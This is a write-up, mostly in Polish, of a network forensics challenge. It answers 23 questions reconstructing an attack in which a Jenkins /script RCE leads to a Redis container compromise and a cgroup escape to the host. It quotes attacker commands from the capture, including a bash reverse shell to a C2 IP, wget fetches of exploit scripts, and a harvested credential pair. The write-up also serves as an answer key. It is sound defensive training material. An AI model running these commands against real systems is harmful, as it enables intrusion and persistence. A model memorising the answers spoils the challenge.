# RediShell - Kinsing
The packet capture was killed mid-attack. Race against incomplete evidence to reconstruct how attackers breached Jenkins, pivoted through containers, and escaped to the host

## Scenario
Before the ransomware deployment, the attackers established initial access through a misconfigured CI/CD server running in a Docker container within Wowza's development network. Security monitoring detected unusual outbound connections from the container subnet to a suspicious external IP address. A packet capture was initiated automatically but was terminated when the attacker discovered and killed the monitoring process. Your task is to analyze this network traffic to understand how the attackers gained their initial foothold and moved laterally within the containerized environment.

## Tools
Analiza pliku .pcap
Najbardziej typowe narzędzie to będzie wireshark.

## Q&A

#### Q1
Security monitoring flagged suspicious HTTP traffic targeting the container subnet. Identifying the first system that received malicious requests is essential for establishing the initial point of compromise. What is the IP address of the first compromised system?
<details>
  <summary>Answer: Click me</summary>
  172.16.10.10
</details>

```
Statistics > Converastion > Ipv4
Pierwsza komunikacja z zewnątrz na która natafiamy w Wireshark trafia właśnie na ten adres Ip.
```

#### Q2
Identifying attacker IP is critical for threat intelligence and blocking future connections. What is the attacker's command and control (C2) IP address?
<details>
  <summary>Answer: Click me</summary>
  185.220.101.50
</details>

```
Analogicznie do pierwszego pytania ten adres pierwszy nawiązał komunikację, co więcej w dalszej jego czesci widać wyknywanie złosliwych zapytań. 
```

#### Q3
What web application and version was exploited for initial access?
<details>
  <summary>Answer: Click me</summary>
  Jenkins, 2.387.1
</details>

```
W nagłówku tej komunikacji widać że zapytania idą poprzez curl. I wodać że odpowiada serwer gdzie jednym z nagłówków jest X-Jenkins: 2.387.1
```

#### Q4
Before fully exploiting a vulnerability, attackers often perform a proof-of-concept test to confirm code execution capabilities. What file did the attacker initially read to test the vulnerability? (Provide full path)
<details>
  <summary>Answer: Click me</summary>
  /etc/passwd
</details>

```
Okazuje się że jenkins w tej wersji podatny jest między innymi na RCE przy dostepie do endpointa /script
Slędząc kolejne konwersacje pomiędzy w/w adresami natrafiamy na wywołanie komendy println 'cat /etc/passwd'.execute().text
```

#### Q5
Identifying this vulnerable endpoint helps understand the attack vector and informs remediation efforts. What is the URI path of the vulnerable endpoint exploited by the attacker?
<details>
  <summary>Answer: Click me</summary>
  /script
</details>

```
Analogicznie do poprzednich pytań w tych samych miejscach odczytujemy na jaki endpoint kierowane jest żadanie.
```

#### Q6
After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
<details>
  <summary>Answer: Click me</summary>
  4444
</details>

```
W kolejnej komunikacji widzimy wykonanie komendy: def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()
W niej widac zawarty port.
```

#### Q7
Once inside the compromised container, the attacker uploaded a well-known enumeration script to identify privilege escalation vectors. What privilege escalation enumeration script did the attacker download after gaining shell access?
<details>
  <summary>Answer: Click me</summary>
  linpeas
</details>

```
Po zestawieniu reverse shell , podążając za komunikacją w kolejnych tcp.stream widzimy komunikację po TCP w której odbywa między innymi pobranie: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

#### Q8
What file did the attacker read to obtain lateral movement credentials? (Provide full path)
<details>
  <summary>Answer: Click me</summary>
  /var/jenkins_home/credentials.txt
</details>

```
Użyte narzędzie LinPEAS posiada wiele ciekawych modułów. Między innymi szuka "ciekawych" plików, sekretów, analizuje usługi, userów i wiele wiele innych. W streame TCP widac wynik prac skryptu, widać tez że atakujący otwiera plik z lokalizacji która jest odpowiedzią.
```

#### Q9
What username and password combination did the attacker use for authentication to the second system? (Format: username:password)
<details>
  <summary>Answer: Click me</summary>
  redis_user:R3d1s_Us3r_P@ss!
</details>

```
Nawiązując do wcześniejszej odpowiedzi, w zawartości pliku są dane telnet dla redis. Widać nawiązanie sesji telnet tymi danymi.
```

#### Q10
The attacker used a legacy protocol to connect to the second target system. What unencrypted protocol did the attacker use for lateral movement?
<details>
  <summary>Answer: Click me</summary>
  telnet
</details>

```
To konsekwencja tego co odkryliśmy w dwoch poprzednich pytaniach.
```

#### Q11
After successfully authenticating with harvested credentials, the attacker gained access to a second container in the environment. Identifying this system helps map the scope of the compromise. What is the IP address of the second compromised system?
<details>
  <summary>Answer: Click me</summary>
  172.16.10.20
</details>

```
Odpowiedz na pytanie nadal jest powiązana z wczesniejszymi odpowiedzami. Adres kolejnego skompromitowanego systemu to adres na który akatujący łaczył się protokołem telnet.
```

#### Q12
The Telnet login banner and subsequent enumeration revealed the hostname and the version of the data storage service running on the second compromised container. This information is crucial for identifying potential vulnerabilities. What is the hostname of the second compromised container and the version of the vulnerable data storage service? (Format: hostname, version)
<details>
  <summary>Answer: Click me</summary>
  redis-db.corp.local, 5.0.7
</details>

```
Na początku sesji telnet iwdać wywołanie komendy hostname co daje nam pierwsza częśc odpowiedzi. Druga częśc nawiązuje do "vulnerable data storage service" co nie do końca jest jasne. Ale przyjmując że jesteśmy na serwerze redis , to pewnie o niego chodzi. W trakcie tej sesji znowu użyto narzędzia "LinPEAS" i jeden z modułów skanuje "Analyzing Redis Files" co w efekcie daje nam w output informacje o wersji.
```

#### Q13
After gaining user-level access to the second container, the attacker uploaded a custom exploit file targeting a vulnerability in the container's data storage service. What file did the attacker upload for privilege escalation on the second system?
<details>
  <summary>Answer: Click me</summary>
  exploit.lua
</details>

```
po zakończeniu działania narzedzia LinPEAS widać wywołanie komendy : wget http://185.220.101.50:2345/exploit.lua oraz redis-cli -h 127.0.0.1 --eval exploit.lua
```

#### Q14
What is the full path of the SUID binary exploited for privilege escalation?
<details>
  <summary>Answer: Click me</summary>
  /usr/local/bin/redis-backup
</details>

```
Atakujący nastepnie prostym skryptem bash wyszukuje pliku "redis-backup" plik zostaje odnaleziony , jego ścieżka bezwzględna jest odpowiedzią. Plik jest uruchamiany. MA najprawdopodobniej dać podniesienie uprawnień.
```

#### Q15
What was the first command the attacker executed after privilege escalation?
<details>
  <summary>Answer: Click me</summary>
  whoami
</details>

```
Komenda widoczna w output po zadziłąniu skryptu.
```

#### Q16
The Lua exploit file uploaded by the attacker targets a specific vulnerability in the Redis scripting subsystem. What CVE number is associated with the Redis Lua subsystem vulnerability used for privilege escalation?
<details>
  <summary>Answer: Click me</summary>
  CVE-2025-49844
</details>

```
Biorąc pod uwagę wersję redis którą mamy na serwerze, oraz kontekst wykonywania skryptów lua przez interpreter do opisuje https://nvd.nist.gov/vuln/detail/CVE-2025-49844 Czyli podatność RCE do wykonania przez skrypty LUA
```

#### Q17
With root access inside the container, the attacker's next objective was escaping to the underlying host system. What is the name of the script executed to escape from the container to the host system?
<details>
  <summary>Answer: Click me</summary>
  escape.sh
</details>

```
Nastepnie w terminalu widzimy pobranie zawartości: wget http://185.220.101.50:2345/escape.sh
```

#### Q18
The container escape script established a new reverse shell connection to the attacker's C2 infrastructure. What port was used for the reverse shell connection after escaping the container?
<details>
  <summary>Answer: Click me</summary>
  5555
</details>

```
Po pobraniu skryptu, widzimy jego uruchomienie oraz output jego działania, między innnymi: "Reverse shell on 185.220.101.50:5555"
```

#### Q19
What CVE number is associated with the container escape vulnerability?
<details>
  <summary>Answer: Click me</summary>
  CVE-2022-0492
</details>

```
Biorąc pod uwagę dość przestarzałego redisa i Ubuntu oraz informacje z outputu działania skryptu: "[+] Exploit triggered via cgroup!" pasuje to do podatności: https://nvd.nist.gov/vuln/detail/cve-2022-0492
```

#### Q20
After successfully escaping to the host system, the attacker created a file to document their access. What is the full path of the proof-of-compromise file created by the attacker on the host system?
<details>
  <summary>Answer: Click me</summary>
  /tmp/you_have_been_hacked.txt
</details>

```
Skrypt oprócz ustanowienia reverse shella tworzy również plik swiadczacy o "zdobyciu przyczółka". Widać to w output działania skryptu.
```

#### Q21
To facilitate uploading additional tools to the compromised host, the attacker installed a Python-based HTTP server that supports file uploads. What server did the attacker install on the host system?
<details>
  <summary>Answer: Click me</summary>
  uploadserver
</details>

```
Po wyskoczeniu z kontenera, widać wyraźne przygotowywanie srodowiska Python, w którymś momencie w output pojawia się: "pip install uploadserver"
```

#### Q22
Using the upload server, the attacker transferred files necessary for installing a kernel-level rootkit, which would provide persistent, stealthy access to the compromised host. What files did the attacker upload to the host system for rootkit installation? (List all files, comma-separated)
<details>
  <summary>Answer: Click me</summary>
  kernel-rootkit.c, Makefile, install-rootkit.sh
</details>

```
Widac było wykonywanie przez atakujacego: "python3 -m uploadserver" , miał prostu sosób na wrzucanie poprzez formularz www plików. Widać aktywnoś na endpoint: http://192.168.192.6:8000/upload , w zawartości kolejnych tcp.stream widac nazwy kolejych uploadowanych plików.
```

#### Q23
Before concluding their session, the attacker discovered that network traffic was being captured and took action to terminate the monitoring process. What is the full command executed by the attacker to terminate the network packet capture process?
<details>
  <summary>Answer: Click me</summary>
  kill -9 24918
</details>

```
To jest ciekawa część. Po ruchomieniu uploadserwera , atakujący grepuje w psaux proces tcpdumpa. Okazuje się że tcpdump zbierał .pcap Akatujący ubija proces.
```

## tl;dr
1. Initial Access & Reconnaissance
  - wykrycie publicznie dostepnego serwera Jenkins (v2.387.1)
  - dostepny endpoint */script* (Groovy RCE)

2. Execution
  - zestawienie reverse shell *bash -i >& /dev/tcp/185.220.101.50/4444 0>&1*

3. Discovery/Enumeration
  - pobranie i wykorzystanie narzędzia LinPEAS, (podobne do [[lightpeas]])
  - enumerowanie narzędziem usług, userów, procesów, poświadczeń etc.

4. Credential Access 
  - odczyt pliku */var/jenkins_home/credentials.txt* i pozyskanie *redis_user:R3d1s_Us3r_P@ss!*

5. Lateral Movement
  - połaczenie telnetem do kolejnego systemu oraz usykanie dostepu do kontenera Redis (v5.0.7)

6. Privilege Escalation
  - wykorzystanie *CVE-2025-49844* poprzez ulopad i wykonanie expolita *exploit.lua*

7. Container Escape
  - wykorzystanie *CVE-2022-0492 (cgroups)* poprzez ulopad i wykonanie expolita *escape.sh*

8. Command & Control (C2)
  - udana ucieczka z kontenera na hosta i zestawienie nowego reverse shella (185.220.101.50:5555)

9. Persistence & Impact
  - przygotowanie środowiska python, przygotwanie *uploadserver* 
  - upload plików *kernel-rootkit.c*, *Makefile*, *install-rootkit.sh*

10. Defense Evasion
  - wykrycie procesu *tcpdump*
  - zakończenie procesu *kill -9 24918*
